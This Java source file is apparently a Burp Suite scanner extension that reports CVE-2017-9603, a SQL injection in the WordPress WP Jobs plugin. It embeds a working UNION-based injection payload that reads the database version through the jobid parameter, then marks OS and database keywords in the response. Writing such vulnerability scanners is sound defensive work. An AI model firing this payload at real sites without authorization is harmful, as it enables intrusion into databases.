package burp;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class WP1 implements IScanIssue{

	IHttpRequestResponse r;
	IHttpRequestResponse[] rr = new IHttpRequestResponse[1];
	URL url;
	String req, res;
	IBurpExtenderCallbacks callback;
    IExtensionHelpers halp;
    int[] reqmarks = new int[2], resmarks = new int[2];
    List<int[]> reqmarkList = new ArrayList<>(1), resmarkList = new ArrayList<>(1);
    IHttpRequestResponse[] rra = new IHttpRequestResponse[1];
	
	public WP1(IHttpRequestResponse r, URL url, IBurpExtenderCallbacks callback, IExtensionHelpers halp)
	{
		this.r = r;
		rr[0] = r; 
		this.url = url;
		this.callback = callback;
		this.halp = halp;
		
		//lets create markers
		req = halp.bytesToString(r.getRequest());
		res = halp.bytesToString(r.getResponse());
		
		reqmarks[0] = req.indexOf("/wp-admin/edit.php?post_type=job&page=WPJobsJobApps&jobid=5+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2C%40%40version%2CNULL%2CNULL--+comment HTTP/1.1");
		reqmarks[1] = reqmarks[0] + new String("/wp-admin/edit.php?post_type=job&page=WPJobsJobApps&jobid=5+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2C%40%40version%2CNULL%2CNULL--+comment HTTP/1.1").length();
		reqmarkList.add(reqmarks);
			
		if(res.contains("ubuntu"))
		{
			resmarks[0] = res.indexOf("ubuntu");
			resmarks[1] = resmarks[0] + new String("ubuntu").length();
	        resmarkList.add(resmarks);
		}
		
		if(res.contains("sql"))
		{
			resmarks[0] = res.indexOf("sql");
			resmarks[1] = resmarks[0] + new String("sql").length();
	        resmarkList.add(resmarks);
		}

		
		if(res.contains("tomcat"))
		{
			resmarks[0] = res.indexOf("tomcat");
			resmarks[1] = resmarks[0] + new String("tomcat").length();
	        resmarkList.add(resmarks);
		}

		
		if(res.contains("redhat"))
		{
			resmarks[0] = res.indexOf("redhat");
			resmarks[1] = resmarks[0] + new String("redhat").length();
	        resmarkList.add(resmarks);
		}
		
		if(res.contains("windows"))
		{
			resmarks[0] = res.indexOf("windows");
			resmarks[1] = resmarks[0] + new String("windows").length();
	        resmarkList.add(resmarks);
		}

		if(res.contains("mysql"))
		{
			resmarks[0] = res.indexOf("mysql");
			resmarks[1] = resmarks[0] + new String("mysql").length();
	        resmarkList.add(resmarks);
		}

        IHttpRequestResponseWithMarkers reqresMark = callback.applyMarkers(r, reqmarkList, resmarkList);
        rra[0] = reqresMark;

	}
	
	@Override
	public URL getUrl() {
		return url;
	}

	@Override
	public String getIssueName() {
		return "WP Jobs Plugin - SQL Injection (CVE-2017-9603)";
	}

	@Override
	public int getIssueType() {
		return 0;
	}

	@Override
	public String getSeverity() {
		return "High";
	}

	@Override
	public String getConfidence() {
		return "Firm";
	}

	@Override
	public String getIssueBackground() {
		return null;
	}

	@Override
	public String getRemediationBackground() {
		return null;
	}

	@Override
	public String getIssueDetail() {
		return "A SQL injection vulnerability in the WP Jobs plugin before 1.5 for WordPress allows authenticated users to execute arbitrary SQL commands via the jobid parameter to wp-admin/edit.php. "
				+ "The version of the underlying database/operating system has been dumped.";
	}

	@Override
	public String getRemediationDetail() {
		return "Update the WP Jobs Plugin to version 1.5 or later.";
		}

	@Override
	public IHttpRequestResponse[] getHttpMessages() {
		return rra;
	}

	@Override
	public IHttpService getHttpService() {
		return r.getHttpService();
		}

}
